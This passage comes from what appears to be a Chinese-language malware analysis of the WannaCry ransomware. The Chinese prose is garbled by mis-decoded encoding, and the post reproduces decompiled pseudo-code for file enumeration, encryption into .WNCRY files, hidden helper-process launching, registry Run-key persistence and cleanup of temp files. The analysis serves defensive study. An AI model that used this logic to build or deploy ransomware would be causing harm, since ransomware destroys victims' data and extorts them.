class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v22Â =Â v18;Â Â </span><br><span class="line"></span><br><span class="line">LOBYTE(v49)Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v23Â =Â (_DWORDÂ *)*v18;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â (_DWORDÂ *)*v18Â !=Â v18Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v24Â =Â v23;Â Â </span><br><span class="line"></span><br><span class="line">v23Â =Â (_DWORDÂ *)*v23;Â Â </span><br><span class="line"></span><br><span class="line">DeleteAllocMem(&amp;v29,Â (<span class="keyword">int</span>)&amp;v36,Â v24);Â Â Â <span class="comment">//Â é‡Šæ”¾æ‰€æœ‰ç”³è¯·çš„ç©ºé—´Â Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¼šé¦–å…ˆéå†æ‰€æœ‰çš„æ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰§è¡Œä¸åŒçš„æ“ä½œå¹¶ä¸”å¯¹åç¼€åè¿›è¡Œè¿‡æ»¤ï¼Œè·³è¿‡@Please_Read_Me@.txtï¼Œ@WanaDecryptor@.exe.lnkï¼Œ@WanaDecryptor@.bmpæ€»ç»“ä¸ºæšä¸¾</p><h3 id="6-2-5-ç¬¬äº”å±‚"><a href="#6-2-5-ç¬¬äº”å±‚" class="headerlink" title="6.2.5 ç¬¬äº”å±‚"></a>6.2.5 ç¬¬äº”å±‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>Â <span class="title">FILE_TYPE</span>Â Â </span></span><br><span class="line"><span class="class">&#123;</span>Â Â </span><br><span class="line">FILE_TYPE_NULLÂ =Â <span class="number">0</span>,Â Â </span><br><span class="line">FILE_TYPE_EXEDLL,Â Â </span><br><span class="line">FILE_TYPE_DOC,Â Â </span><br><span class="line">FILE_TYPE_DOCEX,Â Â </span><br><span class="line">FILE_TYPE_WNCRYT,Â <span class="comment">//.wncrytÂ Â </span></span><br><span class="line">FILE_TYPE_WNCYR,Â <span class="comment">//.wncyrÂ Â </span></span><br><span class="line">FILE_TYPE_WNCRYÂ <span class="comment">//.wncryÂ Â </span></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>Â __thiscallÂ EncryptAllFile(<span class="keyword">const</span>Â <span class="keyword">wchar_t</span>Â <span class="keyword">this</span>,Â <span class="keyword">wchar_t</span>Â TargetFileFullPath,Â <span class="keyword">int</span>Â Num_1)Â Â </span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">wchar_t</span> this_1;Â <span class="comment">//Â ediÂ Â </span></span><br><span class="line"><span class="keyword">int</span>Â result;Â <span class="comment">//Â eaxÂ Â </span></span><br><span class="line">this_1Â =Â <span class="keyword">this</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>Â (Â sub_10002E70(TargetFileFullPath,Â Num_1)Â )<span class="comment">//Â æ ¹æ®è¿”å›å€¼ä¸åŒæ‰§è¡Œä¸åŒçš„æ“ä½œÂ Â </span></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>Â <span class="number">0</span>:Â Â <span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>Â <span class="number">2</span>:Â Â DeleteFileW_Addr(TargetFileFullPath);Â Â <span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>Â <span class="number">3</span>:Â Â <span class="keyword">if</span>Â (Â EncryptFiles(this_1,Â TargetFileFullPath,Â <span class="number">3</span>)Â )<span class="comment">//Â åŠ å¯†æ–‡ä»¶Â </span></span><br><span class="line">&#123;Â Â </span><br><span class="line">wcscat(TargetFileFullPath,Â WNCRT);Â Â </span><br><span class="line">wcscat(TargetFileFullPathÂ +Â <span class="number">360</span>,Â WNCRT);Â Â </span><br><span class="line">((_DWORD)TargetFileFullPathÂ +Â <span class="number">312</span>)Â =Â <span class="number">5</span>;Â Â </span><br><span class="line">&#125;Â Â </span><br><span class="line"><span class="keyword">goto</span>Â LABEL_5;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>Â <span class="number">4</span>:Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â .jpgÂ Â </span></span><br><span class="line">        EncryptFiles(this_1,Â TargetFileFullPath,Â <span class="number">4</span>);Â Â </span><br><span class="line">resultÂ =Â <span class="number">1</span>;Â Â </span><br><span class="line"><span class="keyword">break</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:Â Â </span><br><span class="line"></span><br><span class="line">LABEL_5:Â Â </span><br><span class="line">resultÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"><span class="keyword">break</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"><span class="keyword">return</span>Â result;Â Â </span><br><span class="line">&#125;Â </span><br></pre></td></tr></table></figure><p>é’ˆå¯¹è¯¥å‡½æ•°çš„åŠ å¯†ç­–ç•¥åšä¸€ä¸ªæ€»ç»“ï¼š</p><ol><li><p> åœ¨æšä¸¾æ–‡ä»¶ä¸­ï¼Œcmd=1ï¼Œä¼šå¯¹æ™®é€šæ–‡ä»¶ç›´æ¥åŠ å¯†ä¸º.WNCRYï¼Œä¸å†åŠ å…¥é“¾è¡¨ï¼Œå¤§æ–‡ä»¶å¤„ç†ä¸º.WNCYRï¼Œä»¥åŠå…¶ä»–æœªä½œå¤„ç†æ–‡ä»¶ç»§ç»­åŠ å…¥é“¾è¡¨ç­‰å¾…å¤„ç†</p></li><li><p>æšä¸¾å®Œæˆåï¼Œcmdä»2-4ï¼Œæ¯ä¸ªcmdéå†éƒ½éå†åŠ å¯†æ–‡ä»¶<br> cmd=2ï¼ŒåŠ å¯†FILE_TYPE_DOCEXæ™®é€šæ–‡ä»¶ä¸º.WNCRYï¼ˆç§»å‡ºé“¾è¡¨ï¼‰ï¼Œä»¥åŠFILE_TYPE_DOCEXå¤§æ–‡ä»¶ä¸º.WNCYR<br> cmd=2, åˆ é™¤.WNCRYT</p></li><li><p> cmd=3, åŠ å¯†é“¾è¡¨ä¸­æ‰€æœ‰æ–‡ä»¶ï¼ˆç§»å‡ºé“¾è¡¨ï¼‰</p></li><li><p> cmd=4, åŠ å¯†å¯èƒ½å‰©ä½™é“¾è¡¨ä¸­çš„æ–‡ä»¶</p></li></ol><blockquote><p>è™½ç„¶æ“ä½œä¸åŒ ä½†æ˜¯åŠ å¯†å‡½æ•°æ˜¯åŒä¸€ä¸ª æ¥ä¸‹æ¥å†æ¬¡è¿›å…¥EncryptFiles</p></blockquote><h3 id="6-2-6-ç¬¬å…­å±‚"><a href="#6-2-6-ç¬¬å…­å±‚" class="headerlink" title="6.2.6 ç¬¬å…­å±‚"></a>6.2.6 ç¬¬å…­å±‚</h3><ol><li><p> Â pTargetPostFixÂ =Â wcsrchr(&amp;NewTargetFileFullPath,Â â€˜.â€™);//Â è·å–æ–‡ä»¶åç¼€åÂ Â </p></li><li><p> Â Â pTargetPostFix_1Â =Â pTargetPostFix;Â Â </p></li><li><p> Â Â ifÂ (Â !pTargetPostFixÂ )Â Â </p></li><li><p> Â Â {Â Â </p></li><li><p> Â Â Â Â pTargetPostFix_2Â =Â &NewTargetFileFullPath;Â Â </p></li><li><p> Â Â Â Â gotoÂ LABEL_6;Â Â </p></li><li><p> Â Â }Â Â </p></li><li><p> Â Â IsWNCRYÂ =Â wcsicmp(pTargetPostFix,Â WNCRT);Â Â Â Â Â //Â å°†åç¼€åä¸WNCRYæ¯”è¾ƒÂ Â </p></li><li><p> Â Â pTargetPostFix_2Â =Â pTargetPostFix_1;Â Â </p></li><li><p>Â Â ifÂ (Â IsWNCRYÂ )Â Â </p></li><li><p>Â Â {Â Â </p></li><li><p>LABEL_6:Â Â </p></li><li><p>Â Â Â Â wcscat(pTargetPostFix_2,Â Source);Â Â Â Â Â Â Â Â Â Â Â //Â å­—ç¬¦ä¸²æ‹¼æ¥Â åŸåç¼€+.WNCRYÂ Â </p></li><li><p>Â Â Â Â gotoÂ LABEL_8;Â Â </p></li><li><p>Â Â }Â Â </p></li><li><p>Â Â wcscpy(pTargetPostFix_1,Â Source);Â Â </p></li><li><p>LABEL_8:Â Â </p></li><li><p>Â Â ifÂ (Â GetFileAttributesW(&amp;NewTargetFileFullPath)Â !=Â -1Â Â </p></li><li><p>Â Â Â Â ||Â StartEncryptFiles((charÂ *)v9,Â (int)OldTargetFileFullPath,Â &amp;NewTargetFileFullPath,Â Num_4)Â )//Â å¼€å§‹åŠ å¯†æ–‡ä»¶Â Â </p></li><li><p>Â Â {Â Â </p></li><li><p>Â Â Â Â ifÂ (Â Num_4Â ==Â 4Â )Â Â </p></li><li><p>Â Â Â Â Â Â sub_10002BA0(v9,Â OldTargetFileFullPath);Â Â </p></li><li><p>Â Â Â Â resultÂ =Â 1;Â Â </p></li><li><p>Â Â }Â Â </p></li><li><p>Â Â elseÂ Â </p></li><li><p>Â Â {Â Â </p></li><li><p>Â Â Â Â DeleteFileW_Addr(&amp;NewTargetFileFullPath);Â Â </p></li><li><p>Â Â Â Â resultÂ =Â 0;Â Â </p></li><li><p>Â Â }Â Â </p></li><li><p>Â Â returnÂ result;Â Â </p></li><li><p>}Â Â </p></li></ol><p>è¿™ä¸ªå‡½æ•°ä»ç„¶æ˜¯ä½œä¸ºåŠ å¯†å‡½æ•°çš„å‡†å¤‡å·¥ä½œï¼Œè·å–æ–‡ä»¶çš„åç¼€åï¼Œå°†åç¼€åå’Œ.WNCRYåšæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´å°±ä¸åŠ å¯†ï¼Œç„¶åå°†åŸåç¼€ä¸.WNCRYåšæ‹¼æ¥ï¼Œç„¶åå¼€å§‹åŠ å¯†æ–‡ä»¶</p><h3 id="6-2-7-ç¬¬ä¸ƒå±‚"><a href="#6-2-7-ç¬¬ä¸ƒå±‚" class="headerlink" title="6.2.7 ç¬¬ä¸ƒå±‚"></a>6.2.7 ç¬¬ä¸ƒå±‚</h3><ol><li><p> ifÂ (Â !GetFileSizeEx(hFile_1,Â &amp;FileSize)Â )Â Â Â Â Â //Â è·å–ç›®æ ‡æ–‡ä»¶å¤§å°Â Â </p></li><li><p> {Â Â </p></li><li><p> Â Â local_unwind2((int)&amp;ms_exc.registration,Â -1);Â Â </p></li><li><p> Â Â returnÂ 0;Â Â </p></li><li><p> }Â Â </p></li><li><p> GetFileTime(hFile_1,Â &amp;CreationTime,Â &amp;LastAccessTime,Â &amp;LastWriteTime);//Â è·å–æ–‡ä»¶æ—¶é—´Â Â </p></li><li><p> ifÂ (Â ReadFile_Addr(hFile_1,Â &amp;lpBuffer,Â 8,Â &amp;lpNumberOfBytesRead,Â 0)//Â è¯»å–0x8ä¸ªå­—èŠ‚çš„æ–‡ä»¶å†…å®¹Â Â </p></li><li><p> Â Â &amp;&amp;Â !memcmp(&amp;lpBuffer,Â aWanacry,Â 8u)Â Â Â Â Â Â Â Â Â //Â å°†0x8ä¸ªå­—èŠ‚ä¸WANACRY!æ¯”è¾ƒÂ Â </p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><ol><li> è¯»å–æ–‡ä»¶å‰0x8ä¸ªå­—èŠ‚ï¼Œä¸WNACRYï¼ä½œæ¯”è¾ƒ</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><ol><li><p> SetFilePointer(hFile,Â 0,Â 0,Â 0);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â //Â å°†æ–‡ä»¶æŒ‡é’ˆé‡æ–°è®¾ç½®åˆ°æ–‡ä»¶å¼€å¤´Â Â </p></li><li><p> Â Â ifÂ (Â a4Â ==Â 4Â )Â Â </p></li><li><p> Â Â {Â Â </p></li><li><p> Â Â Â Â swprintf(&amp;String,Â (size_t)aSS,Â NewTargetFileFullPath,Â aT);//Â æ‹¼æ¥å­—ç¬¦ä¸²Â åœ¨åŸæ–‡ä»¶ååŠ ä¸Š.WNCRYTÂ Â </p></li><li><p> Â Â Â Â NewhFileÂ =Â (voidÂ *)CreateFileW_Addr(&amp;String,Â GENERIC_WRITE,Â 0,Â 0,Â CREATE_ALWAYS,Â FILE_ATTRIBUTE_NORMAL,Â 0);//Â åˆ›å»ºæ–‡ä»¶Â Â </p></li></ol><p>2ï¼ä½¿ç”¨æºæ–‡ä»¶å + .WNCRYT åˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºçš„æ–‡ä»¶</p><ol><li><p> ifÂ (Â !EncryptDatas(v32,Â &amp;pbBuffer,Â 0x10u,Â (int)&amp;v17,Â (int)&amp;v20)Â )//Â å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†Â Â </p></li><li><p> Â Â Â Â gotoÂ LABEL_39;Â Â </p></li><li><p> Â Â sub_10005DC0(this_1Â +Â 84,Â (int)&amp;pbBuffer,Â (int)off_1000D8D4,Â 16,Â 16);Â Â </p></li><li><p> Â Â memset(&amp;pbBuffer,Â 0,Â 0x10u);Â Â </p></li><li><p> Â Â ifÂ (Â !WriteFile_Addr(NewhFile,Â aWanacry,Â 8,Â &amp;v35,Â 0)//Â å†™å…¥åˆ°åˆ›å»ºçš„æ–‡ä»¶-&gt;WANACRY!Â Â Â </p></li><li><p> Â Â Â Â ||Â !WriteFile_Addr(NewhFile,Â &amp;v20,Â 4,Â &amp;v35,Â 0)//Â å†™å…¥åˆ°åˆ›å»ºçš„æ–‡ä»¶-&gt;0x100Â Â </p></li><li><p> Â Â Â Â ||Â !WriteFile_Addr(NewhFile,Â &amp;v17,Â v20,Â &amp;v35,Â 0)//Â å†™å…¥0x100ä¸ªå­—èŠ‚çš„åŠ å¯†æ•°æ®åˆ°æ–‡ä»¶Â Â </p></li><li><p> Â Â Â Â ||Â !WriteFile_Addr(NewhFile,Â &amp;a4,Â 4,Â &amp;v35,Â 0)//Â å†™å…¥0x4åˆ°æ–‡ä»¶Â Â </p></li><li><p> Â Â Â Â ||Â !WriteFile_Addr(NewhFile,Â &amp;FileSize,Â 8,Â &amp;v35,Â 0)Â )//Â å†™å…¥0x081006åˆ°æ–‡ä»¶Â </p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li> å°†åŠ å¯†åçš„æ•°æ®å†™å…¥åˆ°æ–°åˆ›å»ºçš„æ–‡ä»¶ä¸­</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><ol><li><p> ifÂ (Â !ReadFile_Addr(hFile_2,Â *((_DWORDÂ *)this_1Â +Â 306),Â 0x10000,Â &amp;lpNumberOfBytesRead,Â 0)Â Â </p></li><li><p> Â Â ||Â lpNumberOfBytesReadÂ !=Â 0x10000Â )Â Â Â Â Â //Â è¯»å–ç›®æ ‡æ–‡ä»¶Â Â </p></li><li><p> {Â Â </p></li><li><p> 21:Â Â </p></li><li><p> Â Â local_unwind2((int)&amp;ms_exc.registration,Â -1);Â Â </p></li><li><p> Â Â returnÂ 0;Â Â </p></li><li><p> }Â Â </p></li><li><p> sub_10006940((int)(this_1Â +Â 84),Â *((_DWORDÂ *)this_1Â +Â 306),Â *((charÂ )this_1Â +Â 307),Â 0x10000u,Â 1);Â Â </p></li><li><p> ifÂ (Â WriteFile_Addr(NewhFile,Â *((_DWORDÂ *)this_1Â +Â 307),Â 0x10000,Â &amp;v35,Â 0)Â &amp;&amp;Â v35Â ==Â 0x10000Â )//Â å°†åŠ å¯†åçš„å†…å®¹å†™å…¥åˆ°æ–°æ–‡ä»¶Â Â </p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li> è¯»å–æºæ–‡ä»¶ï¼Œå¹¶å°†åŠ å¯†åçš„å†…å®¹å†™å…¥åˆ°æ–°åˆ›å»ºçš„æ–‡ä»¶ä¸­</li></ol><p>åˆ°æ­¤ä¸ºæ­¢ï¼ŒåŠ å¯†å‡½æ•°çš„åˆ†æå·²ç»å®Œæˆ</p><h2 id="6-3-å‰©ä½™å‡½æ•°åˆ†æ"><a href="#6-3-å‰©ä½™å‡½æ•°åˆ†æ" class="headerlink" title="6.3 å‰©ä½™å‡½æ•°åˆ†æ"></a>6.3 å‰©ä½™å‡½æ•°åˆ†æ</h2><p>è¿™éƒ¨åˆ†æˆ‘ä»¬å°†å¯¹ t.wnry.dll ä¸­å‰©ä½™çš„å‡½æ•°è¿›è¡Œé€ä¸€çš„åˆ†æ</p><h3 id="6-3-1-StartTaskdl-çº¿ç¨‹å›è°ƒ-éšè—å¯åŠ¨taskdl-exe"><a href="#6-3-1-StartTaskdl-çº¿ç¨‹å›è°ƒ-éšè—å¯åŠ¨taskdl-exe" class="headerlink" title="6.3.1 StartTaskdl çº¿ç¨‹å›è°ƒ+éšè—å¯åŠ¨taskdl.exe"></a>6.3.1 StartTaskdl çº¿ç¨‹å›è°ƒ+éšè—å¯åŠ¨taskdl.exe</h3><ol><li> ifÂ (Â !CreateProcessA(0u,Â lpCommandLine,Â 0u,Â 0u,Â 0,Â 0x8000000u,Â 0u,Â 0u,Â &amp;StartupInfo,Â &amp;ProcessInformation)Â )//Â åˆ›å»ºTaskdl.exeè¿›ç¨‹Â Â </li></ol><p>è¯¥å‡½æ•°æ¯éš”3ç§’ä¼šä»¥éšè—çš„æ–¹å¼å¯åŠ¨ taskdl.exe</p><h3 id="6-3-2-StartExeAndSetReg"><a href="#6-3-2-StartExeAndSetReg" class="headerlink" title="6.3.2 StartExeAndSetReg"></a>6.3.2 StartExeAndSetReg</h3><p>çº¿ç¨‹å›è°ƒ+å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exe)+ä¿®æ”¹æ³¨å†Œè¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ReadFileToMem(&amp;c_wnryBase,Â <span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è¯»å–c.wnryçš„å†…å®¹åˆ°å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">StartTaskseAndDecryptor();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exeÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v1Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">GetFullPathNameA(aTaskscheExe,Â <span class="number">0x208</span>u,Â &amp;Buffer,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â C:UsersDingisoDesktoptasksche.exeÂ Â </span></span><br><span class="line"></span><br><span class="line">SetRegRun((<span class="keyword">int</span>)&amp;Buffer);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è®¾ç½®æ³¨å†Œè¡¨å¯åŠ¨é¡¹Â Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ¯éš”ä¸‰ç§’å¯åŠ¨taskse.exe å’Œ @WanaDecryptor@.exe ç„¶ååˆ©ç”¨ CMD<br>è®¾ç½®æ³¨å†Œè¡¨å¯åŠ¨é¡¹ä¸º tasksche.exe çš„ç»å¯¹åœ°å€</p><h3 id="6-3-3-RepeatOperation-é‡å¤æ“ä½œ"><a href="#6-3-3-RepeatOperation-é‡å¤æ“ä½œ" class="headerlink" title="6.3.3 RepeatOperation é‡å¤æ“ä½œ"></a>6.3.3 RepeatOperation é‡å¤æ“ä½œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>Â (Â GetFileAttributesA(aFWnry)Â ==Â <span class="number">-1</span>Â )Â Â Â Â Â Â Â <span class="comment">//Â æ£€æµ‹f.wnryæ˜¯å¦å­˜åœ¨Â Â </span></span><br><span class="line"></span><br><span class="line">sub_100018F0(&amp;Parameter,Â <span class="number">10</span>,Â <span class="number">100</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CurrentTimeÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">CurrentTimeÂ =Â time(<span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">CreateRes();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å†™å…¥0x8ä¸ªå­—èŠ‚åˆ°00000000.resÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;Dest,Â aSFi,Â NewFileName);Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â @WanaDecryptor@.exeÂ fiÂ Â </span></span><br><span class="line"></span><br><span class="line">StartTargetFile(&amp;Dest,Â <span class="number">0x186A0</span>u,Â <span class="number">0</span>);Â Â </span><br><span class="line"></span><br><span class="line">ReadFileToMem(&amp;c_wnryBase,Â <span class="number">1</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">RunBat();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ›å»ºå¹¶å¯åŠ¨æ‰¹å¤„ç†è„šæœ¬Â Â </span></span><br><span class="line"></span><br><span class="line">CreateReadMe();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ›å»º@Please_Read_Me@.txtÂ Â </span></span><br><span class="line"></span><br><span class="line">EncryptOtherUsersFiles((<span class="keyword">int</span>)&amp;Parameter);Â Â Â Â Â Â <span class="comment">//Â åŠ å¯†windowså‰©ä½™æ‰€æœ‰ç”¨æˆ·çš„æ–‡ä»¶Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æœ‰ä¸‰ä¸ªé‡è¦çš„å‡½æ•°ï¼Œå°±ä¸å±•å¼€åˆ†æäº†ï¼Œæˆ‘åœ¨è¿™é‡Œå°†æŠŠä»–ä»¬çš„é€»è¾‘è¡¨è¿°æ¸…æ¥š</p><ol><li>RunBat():åˆ¤æ–­@WanaDecryptor@.exe.lnkæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œå°†å‘½ä»¤å†™å…¥.batè„šæœ¬è„šæœ¬ä½œç”¨ä¸ºç»™@WanaDecryptor@.exeåˆ›å»ºå¿«æ·æ–¹å¼ï¼‰</li><li>CreateReadMe():æ£€æµ‹å·¥ä½œè·¯å¾„ä¸‹æ˜¯å¦å­˜åœ¨ ReadMeä¸å­˜åœ¨å°±ä»r.wnryä¸­è¯»å–å†…å®¹å¹¶å†™å…¥ ReadMe</li><li> EncryptOtherUsersFiles():è·å–Windowsæ‰€æœ‰çš„ç”¨æˆ·åï¼Œåˆ¤æ–­æ˜¯å¦ä¸å½“å‰çš„æœ‰æˆ·åç›¸åŒï¼Œä¸åŒå°±åŠ å¯†è¯¥ç”¨æˆ·çš„æ‰€æœ‰æ–‡ä»¶</li></ol><h2 id="7-taskdle-exe-ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ"><a href="#7-taskdle-exe-ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ" class="headerlink" title="7 taskdle.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ"></a>7 taskdle.exe ç—…æ¯’è¾…åŠ©æ–‡ä»¶åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">dwDrivesÂ =Â GetLogicalDrives();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç£ç›˜Â Â </span></span><br><span class="line"></span><br><span class="line">v5Â =Â <span class="number">0x19</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">*(_DWORDÂ *)RootPathNameÂ =Â dword_403060;Â Â </span><br><span class="line"></span><br><span class="line">v8Â =Â dword_403064;Â Â </span><br><span class="line"></span><br><span class="line">RootPathName[<span class="number">0</span>]Â =Â v5Â +Â <span class="number">65</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â (dwDrivesÂ &gt;&gt;Â v5)Â &amp;Â <span class="number">1</span>Â &amp;&amp;Â GetDriveTypeW(RootPathName)Â !=Â <span class="number">4</span>Â )<span class="comment">//è·å–Dç›˜ç±»å‹Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">DeleteFile(v5);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ¸…ç©ºå›æ”¶ç«™å’Œä¸´æ—¶ç›®å½•æ‰€æœ‰ä»¥.WNCRYTÂ ç»“å°¾æ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">10u</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">--v5;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â v5Â &gt;=Â <span class="number">2</span>Â );Â Â </span><br></pre></td></tr></table></figure><p>taskdl çš„ä»£ç é‡ç›¸æ¯”ä¸Šé¢çš„å…¶ä»–æ–‡ä»¶å°å¾ˆå¤šäº†ï¼Œä¸»è¦å°±æ˜¯æ¶‰åŠåˆ é™¤æ–‡ä»¶çš„æ“ä½œ</p><h2 id="7-1-DeleteFile-åˆ 